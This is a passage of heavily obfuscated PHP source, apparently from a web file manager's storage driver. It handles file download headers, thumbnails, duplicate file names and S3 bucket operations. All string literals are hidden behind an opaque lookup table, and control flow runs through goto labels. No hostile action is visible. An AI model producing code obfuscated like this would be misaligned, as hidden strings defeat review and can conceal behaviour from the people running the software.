(strstr($fÕÖ÷ Ó¿Û, $Bëæ«å®Ÿ±[116])) { $fÕÖ÷ Ó¿Û = $fÕÖ÷ Ó¿Û . $Bëæ«å®Ÿ±[117]; } if ($d¦©©µÎˆ === !1 && !mime_support($fÕÖ÷ Ó¿Û)) { $d¦©©µÎˆ = !0; $fÕÖ÷ Ó¿Û = $Bëæ«å®Ÿ±[118]; } goto DÎ«Ø²Ìˆ‹; DÊ™œÎÔŸÆ: header($Bëæ«å®Ÿ±[137] . $e¼¾¶ÒŞƒÂ); header($Bëæ«å®Ÿ±[138]); if (!$d¦©©µÎˆ && $F­®…°ç¾ == $Bëæ«å®Ÿ±[139]) { if ($e¼¾¶ÒŞƒÂ > 1024 * 1024 * 5) { die; } $a”«‡Éîò = $this->getContent($b‘¶ÉÈˆ×½); $a”«‡Éîò = Html::clearSVG($a”«‡Éîò); header($Bëæ«å®Ÿ±[140] . strlen($a”«‡Éîò)); echo $a”«‡Éîò; die; } goto fô¥à«Åñç; DˆÂâ·¸Â: @ob_end_clean(); set_timeout(); $cœØ‡ìáÅ = $this->infoFull($b‘¶ÉÈˆ×½); goto Eª´ö‰ÔÉ±; bÔİŞğğ³â: if (isset($_SERVER[$Bëæ«å®Ÿ±[130]]) && strtotime($_SERVER[$Bëæ«å®Ÿ±[130]]) == $cœØ‡ìáÅ[$Bëæ«å®Ÿ±[83]]) { header($Bëæ«å®Ÿ±[131], !0, 304); die; } if (isset($_SERVER[$Bëæ«å®Ÿ±[132]]) && $_SERVER[$Bëæ«å®Ÿ±[132]] == $f¦õé¤¤—) { header($Bëæ«å®Ÿ±[133] . $f¦õé¤¤—, !0, 304); die; } header($Bëæ«å®Ÿ±[133] . $f¦õé¤¤—); goto E†Şº¿ÔÒ˜; E†Şº¿ÔÒ˜: header($Bëæ«å®Ÿ±[134] . $A‹Ì¾á˜ò . $Bëæ«å®Ÿ±[126]); header($Bëæ«å®Ÿ±[135] . $cØíÊ…šî); header($Bëæ«å®Ÿ±[136]); goto DÊ™œÎÔŸÆ; DÔ……¿®¡ß: $Bëæ«å®Ÿ± =& $_SERVER[µ…]; $this->cacheMethod(null, null); if (!$b‘¶ÉÈˆ×½ || !$this->exist($b‘¶ÉÈˆ×½)) { show_json(LNG($Bëæ«å®Ÿ±[104]), !1, $dƒÊƒ…Î‰É); } goto eÛ¦é§Éí; EÇó“Üì‘’: if ($_SERVER[$Bëæ«å®Ÿ±[156]] == $Bëæ«å®Ÿ±[157]) { return; } $eßÊ„ë—¶§ = 1024 * 100; $bÀ¹²‡àÊ¢ = 0; goto b“îÇ†÷¸; dõø”£ »å: if (in_array($F­®…°ç¾, array($Bëæ«å®Ÿ±[110], $Bëæ«å®Ÿ±[111], $Bëæ«å®Ÿ±[112], $Bëæ«å®Ÿ±[113]))) { $F­®…°ç¾ = $Bëæ«å®Ÿ±[114]; } if (!$f¦õé¤¤—) { $f¦õé¤¤— = md5($A‹Ì¾á˜ò . $this->hashSimple($b‘¶ÉÈˆ×½)); } $f¦õé¤¤— = $Bëæ«å®Ÿ±[115] . $f¦õé¤¤— . $Bëæ«å®Ÿ±[115]; goto cÛÑ‚Ü¾‹ï; fô¥à«Åñç: $Aµ«‹×ÈËÁ = strtolower($_SERVER[$Bëæ«å®Ÿ±[141]]); if ($BÅàÚÎáËƒ && $Aµ«‹×ÈËÁ && $DˆŒÁó¤ªÄ) { if (strstr($Aµ«‹×ÈËÁ, $Bëæ«å®Ÿ±[142])) { header($Bëæ«å®Ÿ±[143] . $b‘¶ÉÈˆ×½); } else { if (strstr($Aµ«‹×ÈËÁ, $Bëæ«å®Ÿ±[144])) { header($Bëæ«å®Ÿ±[145] . $b‘¶ÉÈˆ×½); } else { if (strstr($Aµ«‹×ÈËÁ, $Bëæ«å®Ÿ±[146])) { header($Bëæ«å®Ÿ±[147] . $b‘¶ÉÈˆ×½); } } } if ($f™¯ë‚é«) { header($Bëæ«å®Ÿ±[148] . $f™¯ë‚é«); } return; } if (isset($_SERVER[$Bëæ«å®Ÿ±[149]])) { if (preg_match($Bëæ«å®Ÿ±[150], $_SERVER[$Bëæ«å®Ÿ±[149]], $D¡İïªÁå¼)) { $BÂˆ²Âæ = intval($D¡İïªÁå¼[1]); if (!empty($D¡İïªÁå¼[2])) { $dî¡ïœóÖ… = intval($D¡İïªÁå¼[2]); } } header($Bëæ«å®Ÿ±[151]); header("\x43\x6f\x6e\x74\x65\156\164\55\122\x61\156\x67\145\x3a\40\142\171\164\x65\163\x20{$BÂˆ²Âæ}\55{$dî¡ïœóÖ…}\x2f" . $e¼¾¶ÒŞƒÂ); } else { header($Bëæ«å®Ÿ±[152]); } goto b†‹¨ï¹ˆŞ; aÓçº÷Ş¸: $BÂˆ²Âæ = 0; $dî¡ïœóÖ… = $e¼¾¶ÒŞƒÂ - 1; $F­®…°ç¾ = $this->ext($cØíÊ…šî); goto dõø”£ »å; Eª´ö‰ÔÉ±: $e¼¾¶ÒŞƒÂ = $cœØ‡ìáÅ[$Bëæ«å®Ÿ±[77]]; $A‹Ì¾á˜ò = gmdate($Bëæ«å®Ÿ±[109], $cœØ‡ìáÅ[$Bëæ«å®Ÿ±[83]]); $cØíÊ…šî = $dƒÊƒ…Î‰É ? $dƒÊƒ…Î‰É : $this->iconvApp($cœØ‡ìáÅ[$Bëæ«å®Ÿ±[28]]); goto aÓçº÷Ş¸; aÒ²ñóš â: $A·©÷ååÃ = $Bëæ«å®Ÿ±[115] . $A·©÷ååÃ . $Bëæ«å®Ÿ±[121] . $A·©÷ååÃ; if ($d¦©©µÎˆ) { header($Bëæ«å®Ÿ±[122]); header($Bëæ«å®Ÿ±[123] . $A·©÷ååÃ); } else { header($Bëæ«å®Ÿ±[124] . $A·©÷ååÃ); } header($Bëæ«å®Ÿ±[125] . gmdate($Bëæ«å®Ÿ±[109], time() + 3600 * 24 * 30) . $Bëæ«å®Ÿ±[126]); goto AÜ¼ÖéÁÉË; C¿à—ğ–õ˜: } public function fileOutServer($aŞ™Ø¡¤ˆö, $FÍô”¶Ê‡½ = false, $c’‘‡«øˆ» = false, $Cø¿¥¾™› = '') { $this->fileOut($aŞ™Ø¡¤ˆö, $FÍô”¶Ê‡½, $c’‘‡«øˆ», $Cø¿¥¾™›); } public function fileOutLink($BÎ‡‰ï¿œ) { header($_SERVER[µ…][158] . $BÎ‡‰ï¿œ); die; } public function cacheMethod($DÍ¤ÉéÎ, $AÀîñ‡çí, $eóœ¸‰…“ = null) { goto F‘´¾â¤¾‰; CƒÔ¥õç¡: if (!is_null($eóœ¸‰…“)) { $FÒ÷ã«„è[$bÃòáÙšæ] = $eóœ¸‰…“; return; } $A‰‡òæå = isset($FÒ÷ã«„è[$bÃòáÙšæ]) ? $FÒ÷ã«„è[$bÃòáÙšæ] : null; if (!is_null($A‰‡òæå)) { return $A‰‡òæå; } goto c·ÚÏ»òÌÙ; c·ÚÏ»òÌÙ: $A‰‡òæå = $this->{$DÍ¤ÉéÎ}($AÀîñ‡çí); $FÒ÷ã«„è[$bÃòáÙšæ] = $A‰‡òæå; return $A‰‡òæå; goto eéÅê¬»½»; F‘´¾â¤¾‰: $Dìí¨Êï›ğ =& $_SERVER[µ…]; static $FÒ÷ã«„è = array(); $E££òŒØ¼‘ = $AÀîñ‡çí ? ltrim($this->getPathOuter($AÀîñ‡çí), $Dìí¨Êï›ğ[8]) : $AÀîñ‡çí; goto FÍØëËøğÏ; FÍØëËøğÏ: $bÃòáÙšæ = $Dìí¨Êï›ğ[159] . $DÍ¤ÉéÎ . $Dìí¨Êï›ğ[160] . rtrim($E££òŒØ¼‘, $Dìí¨Êï›ğ[8]); if (is_null($DÍ¤ÉéÎ)) { $FÒ÷ã«„è = array(); return; } if (is_null($AÀîñ‡çí)) { unset($FÒ÷ã«„è[$bÃòáÙšæ]); return; } goto CƒÔ¥õç¡; eéÅê¬»½»: } public function fileOutImage($a¹ÂÄÄ®³Æ, $Eê·ƒ»¶ä  = 250) { goto a¶î³„†ä; AÄ§‘Šİå½: IO::fileOut($BÈø‹õœ–ƒ); goto fšóñÕ±¡’; dê…ö‚Ó°Ï: $EÜ”Ø‰ = $AåáÊï±µõ[$f‘Êáöâœ®[28]]; $B”Ä¹¼¶³ = !1; if (isset($GLOBALS[$f‘Êáöâœ®[161]]) && $GLOBALS[$f‘Êáöâœ®[161]][$f‘Êáöâœ®[75]] == $AåáÊï±µõ[$f‘Êáöâœ®[75]]) { $B¾Ø¿ÂêÌÕ = $GLOBALS[$f‘Êáöâœ®[161]][$f‘Êáöâœ®[162]]; if (!$AåáÊï±µõ[$f‘Êáöâœ®[163]]) { $AåáÊï±µõ[$f‘Êáöâœ®[163]] = $GLOBALS[$f‘Êáöâœ®[161]]; } if (isset($B¾Ø¿ÂêÌÕ[$f‘Êáöâœ®[164]])) { if ($B¾Ø¿ÂêÌÕ[$f‘Êáöâœ®[164]] <= $Eê·ƒ»¶ä  && $B¾Ø¿ÂêÌÕ[$f‘Êáöâœ®[165]] <= $Eê·ƒ»¶ä ) { $B”Ä¹¼¶³ = !0; } } $EÜ”Ø‰ = $AåáÊï±µõ[$f‘Êáöâœ®[163]][$f‘Êáöâœ®[28]]; } goto dƒº¯°À„×; a¶î³„†ä: $f‘Êáöâœ® =& $_SERVER[µ…]; if (substr($a¹ÂÄÄ®³Æ, 0, 4) == $f‘Êáöâœ®[146]) { $this->fileOutLink($a¹ÂÄÄ®³Æ); } $AåáÊï±µõ = $this->info($a¹ÂÄÄ®³Æ); goto dê…ö‚Ó°Ï; dƒº¯°À„×: if ($AåáÊï±µõ[$f‘Êáöâœ®[77]] <= 1024 * 50 || $B”Ä¹¼¶³ || !function_exists($f‘Êáöâœ®[166]) || $AåáÊï±µõ[$f‘Êáöâœ®[167]] == $f‘Êáöâœ®[168]) { return $this->fileOut($a¹ÂÄÄ®³Æ, !1, $EÜ”Ø‰); } if (isset($AåáÊï±µõ[$f‘Êáöâœ®[163]][$f‘Êáöâœ®[169]])) { $f¿ìÉ£İğ = $AåáÊï±µõ[$f‘Êáöâœ®[163]][$f‘Êáöâœ®[169]]; } else { if (isset($AåáÊï±µõ[$f‘Êáöâœ®[163]][$f‘Êáöâœ®[170]])) { $f¿ìÉ£İğ = $AåáÊï±µõ[$f‘Êáöâœ®[163]][$f‘Êáöâœ®[170]]; } else { $f¿ìÉ£İğ = md5("{$AåáÊï±µõ[$f‘Êáöâœ®[28]]}\x5f{$AåáÊï±µõ[$f‘Êáöâœ®[75]]}\x5f{$AåáÊï±µõ[$f‘Êáöâœ®[77]]}"); } } $dÇ÷êÉ®ø± = "{$f¿ìÉ£İğ}\x5f{$Eê·ƒ»¶ä }\56\x70\156\x67"; goto aÏÙŞíçãÅ; aÏÙŞíçãÅ: if (!($FñåÔ¨™ñŞ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $f‘Êáöâœ®[171]))) { $BÉ·óŒÂ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $f‘Êáöâœ®[172]); } else { $BÉ·óŒÂ = KodIO::make($FñåÔ¨™ñŞ); } if ($FñåÔ¨™ñŞ = IO::fileNameExist($BÉ·óŒÂ, $dÇ÷êÉ®ø±)) { $Fè’‘İõ´º = KodIO::make($FñåÔ¨™ñŞ); return IO::fileOut($Fè’‘İõ´º, !1, $EÜ”Ø‰); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto A®ğØ‰õŒê; A®ğØ‰õŒê: $Fè’‘İõ´º = DATA_THUMB . $dÇ÷êÉ®ø±; del_file($Fè’‘İõ´º); if (!@file_exists($Fè’‘İõ´º)) { $EŒğ‡ÊÅ = TEMP_FILES; if (!is_dir($EŒğ‡ÊÅ)) { mk_dir($EŒğ‡ÊÅ); } $BÖ¡ØÙ³¨ = $EŒğ‡ÊÅ . $f¿ìÉ£İğ . $f‘Êáöâœ®[94] . $AåáÊï±µõ[$f‘Êáöâœ®[167]]; if (!@file_exists($BÖ¡ØÙ³¨)) { $BÖ¡ØÙ³¨ = $this->download($a¹ÂÄÄ®³Æ, $BÖ¡ØÙ³¨); } ImageThumb::createThumb($BÖ¡ØÙ³¨, $Fè’‘İõ´º, $Eê·ƒ»¶ä , $Eê·ƒ»¶ä  * 10); } goto D†‚Çå“ƒå; D†‚Çå“ƒå: if (!file_exists($Fè’‘İõ´º) || filesize($Fè’‘İõ´º) < 100) { return @file_exists($BÖ¡ØÙ³¨) ? IO::fileOut($BÖ¡ØÙ³¨) : $this->fileOut($a¹ÂÄÄ®³Æ); } if (!($BÈø‹õœ–ƒ = IO::move($Fè’‘İõ´º, $BÉ·óŒÂ))) { return IO::fileOut($Fè’‘İõ´º); } del_file($Fè’‘İõ´º); goto AÄ§‘Šİå½; fšóñÕ±¡’: } public function fileOutImageServer($dÍÛì†“, $EŒ‡æ³¸× = 250) { $this->fileOutImage($dÍÛì†“, $EŒ‡æ³¸×); } public function fileNameAuto($FŞçÑ”ÉÙ©, $CŒ¾Ì‹‰È, $bÔÔŸô¶«í = REPEAT_RENAME, $bÜˆâ©©¾Ê = false) { goto dÃÇÃÚ‹…²; dÃÇÃÚ‹…²: $eîéÒè‰‘æ =& $_SERVER[µ…]; $CšÃŠŒİêĞ = $FŞçÑ”ÉÙ© === $eîéÒè‰‘æ[33] ? $CŒ¾Ì‹‰È : rtrim($FŞçÑ”ÉÙ©, $eîéÒè‰‘æ[8]) . $eîéÒè‰‘æ[8] . $CŒ¾Ì‹‰È; if ($bÔÔŸô¶«í == REPEAT_REPLACE || !$this->exist($CšÃŠŒİêĞ) || $bÜˆâ©©¾Ê && $bÔÔŸô¶«í != REPEAT_RENAME_FOLDER) { return $CŒ¾Ì‹‰È; } goto BÊ“¹æ®Ôß; BİÔÀ°‘Š: $Fœ›·¡æ¶° = 1; $F‡¯§ª¬Š = substr($CŒ¾Ì‹‰È, 0, strlen($CŒ¾Ì‹‰È) - strlen($dÚ‰Œ¢‰‚ƒ)); $cˆôô¾ ‡ = $F‡¯§ª¬Š . "\x28{$Fœ›·¡æ¶°}\x29{$dÚ‰Œ¢‰‚ƒ}"; goto d°…‚“—‘ª; d°…‚“—‘ª: while ($this->exist(rtrim($FŞçÑ”ÉÙ©, $eîéÒè‰‘æ[8]) . $eîéÒè‰‘æ[8] . $cˆôô¾ ‡)) { $cˆôô¾ ‡ = $F‡¯§ª¬Š . "\x28{$Fœ›·¡æ¶°}\x29{$dÚ‰Œ¢‰‚ƒ}"; $Fœ›·¡æ¶°++; } return $cˆôô¾ ‡; goto AÌßŠ‰³Á; BÊ“¹æ®Ôß: if ($bÔÔŸô¶«í == REPEAT_SKIP) { return !1; } $dÚ‰Œ¢‰‚ƒ = $eîéÒè‰‘æ[94] . get_path_ext($CŒ¾Ì‹‰È); $dÚ‰Œ¢‰‚ƒ = $dÚ‰Œ¢‰‚ƒ == $eîéÒè‰‘æ[94] || $bÜˆâ©©¾Ê ? $eîéÒè‰‘æ[33] : $dÚ‰Œ¢‰‚ƒ; goto BİÔÀ°‘Š; AÌßŠ‰³Á: } private function fileNameAutoList($aŸ¹Îå¾Ô, $d¥»¥á½¯±, $fŠÃÕòñ‡ = false) { goto CÀ§Ú…óƒ; b¦ïø·Ÿ˜ñ: $FˆÓÀôÎôÕ = array_to_keyvalue($e±Õ”±–ˆ , $aµ…©Ğ†Š[33], $aµ…©Ğ†Š[28]); $c¤ñë‚ó²¤ = $aµ…©Ğ†Š[94] . get_path_ext($d¥»¥á½¯±); $c¤ñë‚ó²¤ = $c¤ñë‚ó²¤ == $aµ…©Ğ†Š[94] || $fŠÃÕòñ‡ ? $aµ…©Ğ†Š[33] : $c¤ñë‚ó²¤; goto aËßË˜Ëöô; CÀ§Ú…óƒ: $aµ…©Ğ†Š =& $_SERVER[µ…]; $e±Õ”±–ˆ  = $this->listPath($aŸ¹Îå¾Ô, !0); $e±Õ”±–ˆ  = array_merge($e±Õ”±–ˆ [$aµ…©Ğ†Š[74]], $e±Õ”±–ˆ [$aµ…©Ğ†Š[73]]); goto b¦ïø·Ÿ˜ñ; cÎí±²›Ä: return $CĞä—‡÷¶Ö; goto E¥º›ñ¬»®; aËßË˜Ëöô: $e•ù†îù¶¼ = substr($d¥»¥á½¯±, 0, strlen($d¥»¥á½¯±) - strlen($c¤ñë‚ó²¤)); $CĞä—‡÷¶Ö = $e•ù†îù¶¼ . "\x28\60\51{$c¤ñë‚ó²¤}"; for ($d¢İÇ½«»­ = 1; $d¢İÇ½«»­ <= count($FˆÓÀôÎôÕ) + 1; $d¢İÇ½«»­++) { $CĞä—‡÷¶Ö = $e•ù†îù¶¼ . "\x28{$d¢İÇ½«»­}\51{$c¤ñë‚ó²¤}"; if (!in_array_not_case($CĞä—‡÷¶Ö, $FˆÓÀôÎôÕ)) { return $CĞä—‡÷¶Ö; } } goto cÎí±²›Ä; E¥º›ñ¬»®: } public function listAllFiles($fÕê¥åÇ½¡, $b‚•ŞêôŒ¸, $dõß…å¹ = array()) { goto aÓÖ‚ùô¯¦; aÓÖ‚ùô¯¦: $e°–‘¼Å¸ó =& $_SERVER[µ…]; if (empty($b‚•ŞêôŒ¸)) { return array(); } $Då—è‡„ì  = array(); goto fÙêÚÖëì¥; fÙêÚÖëì¥: $fÕê¥åÇ½¡ = trim($fÕê¥åÇ½¡, $e°–‘¼Å¸ó[8]); foreach ($b‚•ŞêôŒ¸ as $B²Ë‘“ÙÚµ) { $FŒ‹°¾¾…è = ltrim(substr(trim($B²Ë‘“ÙÚµ, $e°–‘¼Å¸ó[8]), strlen($fÕê¥åÇ½¡)), $e°–‘¼Å¸ó[8]); $Då—è‡„ì  = array_merge($Då—è‡„ì , $this->slicePath($FŒ‹°¾¾…è)); } $B½ë³½¦ùŸ = array(); goto f‘±ŠÍæßÂ; f‘±ŠÍæßÂ: foreach (array_unique($Då—è‡„ì ) as $B²Ë‘“ÙÚµ) { $bÙ‚ŒğÑï÷ = array($e°–‘¼Å¸ó[75] => $this->getPathOuter($e°–‘¼Å¸ó[8] . $fÕê¥åÇ½¡ . $e°–‘¼Å¸ó[8] . $B²Ë‘“ÙÚµ), $e°–‘¼Å¸ó[76] => 1, $e°–‘¼Å¸ó[77] => 0); if (substr($B²Ë‘“ÙÚµ, -1) != $e°–‘¼Å¸ó[8]) { $bÙ‚ŒğÑï÷[$e°–‘¼Å¸ó[76]] = 0; $cë„ÅŸ¤¾ğ = $this->getPath($fÕê¥åÇ½¡ . $e°–‘¼Å¸ó[8] . $B²Ë‘“ÙÚµ); $bÙ‚ŒğÑï÷[$e°–‘¼Å¸ó[77]] = isset($dõß…å¹[$cë„ÅŸ¤¾ğ]) ? $dõß…å¹[$cë„ÅŸ¤¾ğ] : $this->size($cë„ÅŸ¤¾ğ); } $B½ë³½¦ùŸ[] = $bÙ‚ŒğÑï÷; } return $B½ë³½¦ùŸ; goto e±†¾´ŸˆÆ; e±†¾´ŸˆÆ: } public function slicePath($FÄ‚ÏÏèğñ) { $d—÷¨½ë¹¡ =& $_SERVER[µ…]; $f´¡’”¡ßƒ = explode($d—÷¨½ë¹¡[8], trim($FÄ‚ÏÏèğñ, $d—÷¨½ë¹¡[8])); $Dšòø×„ƒ´ = 0; do { ++$Dšòø×„ƒ´; $eŸšèİù®[] = implode($d—÷¨½ë¹¡[8], array_slice($f´¡’”¡ßƒ, 0, $Dšòø×„ƒ´)) . $d—÷¨½ë¹¡[8]; } while ($Dšòø×„ƒ´ < count($f´¡’”¡ßƒ)); $eŸšèİù®[count($f´¡’”¡ßƒ) - 1] = $FÄ‚ÏÏèğñ; return $eŸšèİù®; } public function getHost() { $CÚÑÈõÉĞÏ =& $_SERVER[µ…]; $f ‚‰ç± = parse_url(trim($this->domain, $CÚÑÈõÉĞÏ[8])); $f˜†İ“í÷ß = isset($f ‚‰ç±[$CÚÑÈõÉĞÏ[173]]) ? $f ‚‰ç±[$CÚÑÈõÉĞÏ[173]] : http_type(); $F’ÌÏà¨ÈŸ = isset($f ‚‰ç±[$CÚÑÈõÉĞÏ[174]]) ? $f ‚‰ç±[$CÚÑÈõÉĞÏ[174]] : $f ‚‰ç±[$CÚÑÈõÉĞÏ[75]]; if (isset($f ‚‰ç±[$CÚÑÈõÉĞÏ[175]])) { $F’ÌÏà¨ÈŸ .= $CÚÑÈõÉĞÏ[4] . $f ‚‰ç±[$CÚÑÈõÉĞÏ[175]]; } return $f˜†İ“í÷ß . $CÚÑÈõÉĞÏ[176] . $F’ÌÏà¨ÈŸ; } public function pathEncode($aÍ‚— ¾«‚) { $CÏÛğ°’Â¨ =& $_SERVER[µ…]; return str_replace($CÏÛğ°’Â¨[177], $CÏÛğ°’Â¨[8], rawurlencode($aÍ‚— ¾«‚)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Aâ ÕîÍ®Œ) { set_timeout(); require_once SDK_DIR . $_SERVER[µ…][178]; parent::__construct(); $this->_init($Aâ ÕîÍ®Œ); } public function _init($e½¶ÜŠ›Ïæ) { foreach ($e½¶ÜŠ›Ïæ as $fË…§´ÕÂ‹ => $aà’²íŞ‰ä) { if (isset($this->{$fË…§´ÕÂ‹})) { $this->{$fË…§´ÕÂ‹} = $aà’²íŞ‰ä; } } $this->endpoint = $e½¶ÜŠ›Ïæ[$_SERVER[µ…][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($a‡¥Æ·éƒé = "\x76\64") { $this->signVer = $a‡¥Æ·éƒé; $this->client->setSignatureVersion($a‡¥Æ·éƒé); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto a¤ªÛñ‡õ†; Eè±×ÇÄ: if ($c†‹‡ù¶[$d™õéáó÷¤[180]] != $d™õéáó÷¤[181] || $c†‹‡ù¶[$d™õéáó÷¤[182]] != $d™õéáó÷¤[181]) { return !1; } $b‰º–ˆì×ó = array_map($d™õéáó÷¤[183], $c†‹‡ù¶[$d™õéáó÷¤[184]]); if (!is_array($b‰º–ˆì×ó)) { $b‰º–ˆì×ó = array(); } goto a‘‰óàöö; a‘‰óàöö: $a˜Å÷ŒÂİ = array($d™õéáó÷¤[185], $d™õéáó÷¤[186], $d™õéáó÷¤[187], $d™õéáó÷¤[188], $d™õéáó÷¤[189]); $F¬Ğ³ø‡…¥ = array_diff($a˜Å÷ŒÂİ, $b‰º–ˆì×ó); return empty($F¬Ğ³ø‡…¥); goto fò’Û÷­¥«; a¤ªÛñ‡õ†: $d™õéáó÷¤ =& $_SERVER[µ…]; $c†‹‡ù¶ = $this->getBucketCors(); if (!$c†‹‡ù¶ || !is_array($c†‹‡ù¶)) { return !1; } goto Eè±×ÇÄ; fò’Û÷­¥«: } public function mkfile($c˜í¾ö…ñŞ, $EÒï“ÎÉî‰ = '', $dŠ®¼§¢‘ = REPEAT_RENAME) { $e‹¥˜•ìß° = $this->setContent($c˜í¾ö…ñŞ, $EÒï“ÎÉî‰); if ($e‹¥˜•ìß° !== !1) { return $this->getPathOuter($c˜í¾ö…ñŞ); } return !1; } public function mkdir($d¢ëŠ—ç¶É, $eÊ–¿÷òª = REPEAT_SKIP) { if (empty($d¢ëŠ—ç¶É)) { return !1; } if ($this->_isFolder($d¢ëŠ—ç¶É)) { return $this->getPathOuter($d¢ëŠ—ç¶É); } $eÅ¸±İäÊ = $this->setContent($d¢ëŠ—ç¶É, $_SERVER[µ…][33], !0); if ($eÅ¸±İäÊ !== !1) { return $this->getPathOuter($d¢ëŠ—ç¶É); } return !1; } public function copyFile($DÍôõ•¯ßÖ, $E°ğÅ¬šªõ, $FˆÆŞ¡×¯ = array()) { $F”²·š¦Ä˜ =& $_SERVER[µ…]; $dù‹½‘ ÛÚ = $this->objectMeta($DÍôõ•¯ßÖ); if (!$dù‹½‘ ÛÚ) { return !1; } if ($dù‹½‘ ÛÚ[$F”²·š¦Ä˜[77]] <= 1024 * 1024 * 200) { $A¹Ô¤°Üƒ = $this->client->copyObject($this->bucket, $DÍôõ•¯ßÖ, $this->bucket, $E°ğÅ¬šªõ, $F”²·š¦Ä˜[190], $FˆÆŞ¡×¯); } else { $A¹Ô¤°Üƒ = $this->client->multiCopyObject($this->bucket, $DÍôõ•¯ßÖ, $this->bucket, $E°ğÅ¬šªõ, $FˆÆŞ¡×¯); } $A¹Ô¤°Üƒ = $A¹Ô¤°Üƒ ? $this->getPathOuter($E°ğÅ¬šªõ) : !1; return $A¹Ô¤°Üƒ; } public function moveFile($D†×®¦İê, $BŠ•ĞÄÉã†) { if ($this->copyFile($D†×®¦İê, $BŠ•ĞÄÉã†)) { $this->delFile($D†×®¦İê); return $this->getPathOuter($BŠ•ĞÄÉã†); } return !1; } public function delFile($dçÎéèŞÈÌ) { return $this->client->deleteObject($this->bucket, $dçÎéèŞÈÌ); } public function delFolder($F¼¾ğÊíà») { goto d”ŒŸÎö°Ñ; DÀôšÅ¿°õ: return $this->delByBatch($dš»É–ƒ[$B›÷¬ŠÂê[74]]); goto fù•œÆ¶Ñœ; FğµŞ™ÕÚ‡: if (!empty($F¼¾ğÊíà») && !in_array($fŸ—¢İ—Û, $dš»É–ƒ[$B›÷¬ŠÂê[74]])) { $dš»É–ƒ[$B›÷¬ŠÂê[74]][] = $fŸ—¢İ—Û; } $fƒÅ¾Ğ‡ = $this->delByBatch($dš»É–ƒ[$B›÷¬ŠÂê[73]]); if (!$fƒÅ¾Ğ‡) { return !1; } goto DÀôšÅ¿°õ; aˆ£ôì÷ó: $dš»É–ƒ = $this->fileList($F¼¾ğÊíà»); $this->listItemCache = !0; $fŸ—¢İ—Û = trim($F¼¾ğÊíà», $B›÷¬ŠÂê[8]) . $B›÷¬ŠÂê[8]; goto FğµŞ™ÕÚ‡; d”ŒŸÎö°Ñ: $B›÷¬ŠÂê =& $_SERVER[µ…]; if (!$this->exist($F¼¾ğÊíà»)) { return !0; } $this->listItemCache = !1; goto aˆ£ôì÷ó; fù•œÆ¶Ñœ: } private function delByBatch($fíß¿‡°Õ) { foreach (array_chunk($fíß¿‡°Õ, 1000) as $EÙ‘áËÛà¢) { $a¶£îéˆè = $this->client->deleteObjects($this->bucket, $EÙ‘áËÛà¢); if (!$a¶£îéˆè) { return !1; } } return !0; } public function rename($cÌÖªâì, $b±„Ÿñì) { return $this->renameObject($cÌÖªâì, $b±„Ÿñì); } public function listPath($eéø‹ÉÈ‹Û, $CÄ²Ïó–”â = false) { $aõŠé›Š—¼ =& $_SERVER[µ…]; $b¿ÚÎ£ª³Á = $this->fileList($eéø‹ÉÈ‹Û, $aõŠé›Š—¼[8], !0); foreach ($b¿ÚÎ£ª³Á[$aõŠé›Š—¼[74]] as $CãÕÌîİğ => $E‡…ğƒ—) { $b¿ÚÎ£ª³Á[$aõŠé›Š—¼[74]][$CãÕÌîİğ] = $this->folderInfo($E‡…ğƒ—, $CÄ²Ïó–”â); } foreach ($b¿ÚÎ£ª³Á[$aõŠé›Š—¼[73]] as $CãÕÌîİğ => $E‡…ğƒ—) { $b¿ÚÎ£ª³Á[$aõŠé›Š—¼[73]][$CãÕÌîİğ] = $this->fileInfo($E‡…ğƒ—[$aõŠé›Š—¼[28]], $CÄ²Ïó–”â, $E‡…ğƒ—); } return $b¿ÚÎ£ª³Á; } private function fileInfo($Dèº¾÷²ïÎ, $BÚªÛÉÔ£ë = false, $AƒÛÂÎÓŸ = array()) { goto d …¶®à; EÁ¨Şùªã: $F×¶™Â®“‚[$fÓíÛÔİ»[192]] = $F×¶™Â®“‚[$fÓíÛÔİ»[83]] = 0; $F×¶™Â®“‚[$fÓíÛÔİ»[193]] = $F×¶™Â®“‚[$fÓíÛÔİ»[194]] = !0; if (empty($AƒÛÂÎÓŸ)) { $AƒÛÂÎÓŸ = $this->objectMeta($Dèº¾÷²ïÎ); if (!$AƒÛÂÎÓŸ) { return $F×¶™Â®“‚; } } goto DÛé‡ä¦›; d …¶®à: $fÓíÛÔİ» =& $_SERVER[µ…]; $F×¶™Â®“‚ = array($fÓíÛÔİ»[28] => $this->pathThis($Dèº¾÷²ïÎ), $fÓíÛÔİ»[75] => $this->getPathOuter($Dèº¾÷²ïÎ), $fÓíÛÔİ»[29] => $fÓíÛÔİ»[191], $fÓíÛÔİ»[167] => $this->ext($Dèº¾÷²ïÎ), $fÓíÛÔİ»[77] => isset($AƒÛÂÎÓŸ[$fÓíÛÔİ»[77]]) ? $AƒÛÂÎÓŸ[$fÓíÛÔİ»[77]] : 0); if ($BÚªÛÉÔ£ë) { return $F×¶™Â®“‚; } goto EÁ¨Şùªã; DÛé‡ä¦›: if (isset($AƒÛÂÎÓŸ[$fÓíÛÔİ»[195]])) { $F×¶™Â®“‚[$fÓíÛÔİ»[83]] = $AƒÛÂÎÓŸ[$fÓíÛÔİ»[195]]; } if (isset($AƒÛÂÎÓŸ[$fÓíÛÔİ»[77]])) { $F×¶™Â®“‚[$fÓíÛÔİ»[77]] = $AƒÛÂÎÓŸ[$fÓíÛÔİ»[77]]; } return $F×¶™Â®“‚; goto cŠ¶‡ïŠÍ¥; cŠ¶‡ïŠÍ¥: } private function folderInfo($däŞ•í²‘ƒ, $fâ Ö’¡–Å = false) { goto bğ˜­ÍÚ®İ; bğ˜­ÍÚ®İ: $Aä‰ÀÅó²Š =& $_SERVER[µ…]; $cæ‰ê›â = array($Aä‰ÀÅó²Š[28] => $this->pathThis($däŞ•í²‘ƒ), $Aä‰ÀÅó²Š[75] => 